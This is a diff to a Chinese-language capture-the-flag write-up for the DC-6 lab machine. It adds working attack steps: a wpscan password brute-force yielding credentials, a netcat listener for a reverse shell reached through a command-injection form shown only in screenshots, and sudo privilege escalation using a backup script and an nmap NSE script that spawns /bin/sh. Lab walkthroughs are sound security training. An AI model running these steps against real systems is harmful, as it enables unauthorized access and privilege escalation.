@@ -318,7 +318,6 @@ CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
  | Confirmed By: Login Error Messages (Aggressive Detection)
 ```
 
-
 ### 整理，得
 
 ```
@@ -348,35 +347,119 @@ jens
 
 太长了，放弃
 
-看看有没有漏洞
+![[Pasted image 20250621193525.png]]
+![[Pasted image 20250621194044.png]]
+参考给出的提示
 
-```
+重新破解
+
+```shell
 ┌──(kali㉿kali)-[~]
-└─$ nmap --script=vuln 192.168.7.134
-```
-
-
-```
+└─$ cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords-dc6.txt
 ┌──(kali㉿kali)-[~]
-└─$ searchsploit wordpress 5.1.1
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                                   |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                                                                                          | php/webapps/51042.txt
-WordPress Core 1.5.1.1 - 'add new admin' SQL Injection                                                                                           | php/webapps/1059.pl
-WordPress Core 1.5.1.1 - SQL Injection                                                                                                           | php/webapps/1033.pl
-WordPress Core 1.5.1.1 < 2.2.2 - Multiple Vulnerabilities                                                                                        | php/webapps/4397.rb
-WordPress Core 1.5.1.2 - 'xmlrpc' Interface SQL Injection                                                                                        | php/webapps/1077.pl
-WordPress Core 1.5.1.3 - Remote Code Execution (Metasploit)                                                                                      | php/webapps/1145.pm
-WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                          | multiple/webapps/47690.md
-WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                                          | php/dos/47800.py
-WordPress Plugin Cart66 1.5.1.14 - Multiple Vulnerabilities                                                                                      | php/webapps/28959.txt
-WordPress Plugin Cart66 Lite eCommerce 1.5.1.17 - Blind SQL Injection                                                                            | php/webapps/35459.txt
-WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)                                                                      | php/remote/47187.rb
-WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                              | php/webapps/39553.txt
-WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                        | php/webapps/44943.txt
-Wordpress Plugin Maintenance Mode by SeedProd 5.1.1 - Persistent Cross-Site Scripting                                                            | php/webapps/48724.txt
-WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                      | php/webapps/48918.sh
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
+└─$ wpscan --url http://wordy/ -U dc6-user.txt -P passwords-dc6.txt
 ```
+
+```shell
+[!] Valid Combinations Found:
+ | Username: mark, Password: helpdesk01
+```
+
+下面尝试登录
+
+![[Pasted image 20250621194239.png]]
+
+dirb取得管理员url
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ dirb http://192.168.7.134
+```
+
+![[Pasted image 20250621194910.png]]
+
+![[Pasted image 20250621195748.png]]
+
+成功登录
+
+![[Pasted image 20250621195939.png]]
+
+活动监视下有个工具
+
+![[Pasted image 20250621200132.png]]
+
+它可以反向解析主机，测试的IP地址是中国电信的DNS
+![[Pasted image 20250621202208.png]]
+这里的输入框有限制，换个短的ip
+![[Pasted image 20250621202230.png]]
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ nc -lvvp 2333
+```
+
+抓包修改
+
+![[Pasted image 20250621203037.png]]
+
+![[Pasted image 20250621203145.png]]
+
+```shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+![[Pasted image 20250621203355.png]]
+
+![[Pasted image 20250621203606.png]]
+
+jens目录下有一个脚本文件，其中的命令是压缩html目录
+
+
+mark/stuff目录下有一个 things-to-do.txt
+![[Pasted image 20250621204017.png]]
+
+其中有说添加新用户
+那么尝试一下ssh登录
+![[Pasted image 20250621204549.png]]
+GSo7isUM1D4就是graham的密码
+
+![[Pasted image 20250621204644.png]]
+
+无密码sudo的
+
+![[Pasted image 20250621205054.png]]
+
+尝试使用vim编辑，vim没有安装
+
+使用echo加重定向修改文件
+添加一行/bin/bash，尝试提权
+
+```shell
+graham@dc-6:~$ sudo -u jens /home/jens/backups.sh
+```
+
+![[Pasted image 20250621205347.png]]
+用户jens可以无密码使用该命令
+在sudo时指定用户
+
+现在是jens用户下了
+
+![[Pasted image 20250621205900.png]]
+这个用户可以无密码使用nmap
+
+新建一个脚本文件
+
+```shell
+jens@dc-6:~$ echo 'os.execute("/bin/sh")' > bash.nse
+```
+
+为什么不是bash，用bash的话会出现无法交互的问题
+
+```shell
+jens@dc-6:~$ sudo nmap --script=bash.nse
+```
+
+![[Pasted image 20250621210735.png]]
+
+直接输入ls就能看到flag
+直接查看 cat theflag.txt 
